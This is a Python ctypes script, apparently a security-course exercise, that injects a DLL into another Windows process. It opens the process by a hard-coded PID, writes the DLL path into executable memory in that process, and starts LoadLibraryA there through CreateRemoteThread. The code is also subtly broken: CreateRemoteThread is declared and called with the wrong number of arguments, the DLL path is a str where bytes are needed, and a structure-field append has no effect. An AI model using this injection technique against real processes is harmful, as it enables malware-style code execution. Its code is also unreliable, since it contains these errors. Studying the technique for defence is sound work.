from ctypes import *
from ctypes import wintypes

kernel32 = windll.kernel32
LPCSTR = c_char_p
SIZE_T = c_size_t

#Open Process
OpenProcess = kernel32.OpenProcess
OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
OpenProcess.restype = wintypes.HANDLE

#Virtual Allocation
VirtualAllocEx = kernel32.VirtualAllocEx
VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD, wintypes.DWORD]
VirtualAllocEx.restype = wintypes.LPVOID

WriteProcessMemory = kernel32.WriteProcessMemory
WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, SIZE_T, POINTER(SIZE_T)]
WriteProcessMemory.restype = wintypes.BOOL

GetModuleHandleA = kernel32.GetModuleHandleA
GetModuleHandleA.argtypes = [LPCSTR]
GetModuleHandleA.restype = wintypes.HANDLE

GetProcAddress = kernel32.GetProcAddress
GetProcAddress.argtypes = [wintypes.HANDLE, LPCSTR]
GetProcAddress.restype = wintypes.LPVOID

class _SECURITY_ATTRIBUTES(Structure):
    _fields_ = [("nLength", wintypes.DWORD),
                ("lpSecurityDescriptor", wintypes.LPVOID),
                ("bInheritHandle", wintypes.BOOL)]

    
_SECURITY_ATTRIBUTES._fields_.append(("hHandle", wintypes.HANDLE))
LPSECURITY_ATTRIBUTES = POINTER(_SECURITY_ATTRIBUTES)
LPTHREAD_START_ROUTINE = wintypes.LPVOID


CreateRemoteThread = kernel32.CreateRemoteThread
CreateRemoteThread.argtypes = [wintypes.HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, wintypes.LPVOID, wintypes.LPVOID, LPTHREAD_START_ROUTINE, wintypes.LPVOID, wintypes.DWORD,wintypes.LPDWORD]
CreateRemoteThread.restype = wintypes.HANDLE


dll = "C:\\Users\\Lenovo\\Documents\\TCM_Security\\Python201\\Python_Projects\\Remote_DLL_injection\\Remote_DLL\\Dll2.dll"
pid = 13884
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x40
EXECUTE_IMMEDIATELY = 0x0
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0x00000FFF)

pid = 28160
handle = OpenProcess(PROCESS_ALL_ACCESS, False, pid)

if not handle:
    raise WinError()
print("Handle obtained => {0:X}".format(handle))

remote_memory = VirtualAllocEx(handle, False, len(dll) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)

if not remote_memory:
    raise WinError()

print("Remote memory allocated =>", hex(remote_memory))

#Write to memory of process
write = WriteProcessMemory(handle, remote_memory, dll, len(dll) + 1, None)

if not write:
    raise WinError()

print("Bytes written=> {0}".format(dll))

#Load module
load_lib = GetProcAddress(GetModuleHandleA(b"kernel32.dll"), b"LoadLibraryA")
print("LoadLibrary address=>", hex(load_lib))


rthread = CreateRemoteThread(handle, None, 0, load_lib, remote_memory, EXECUTE_IMMEDIATELY, None, 0, None)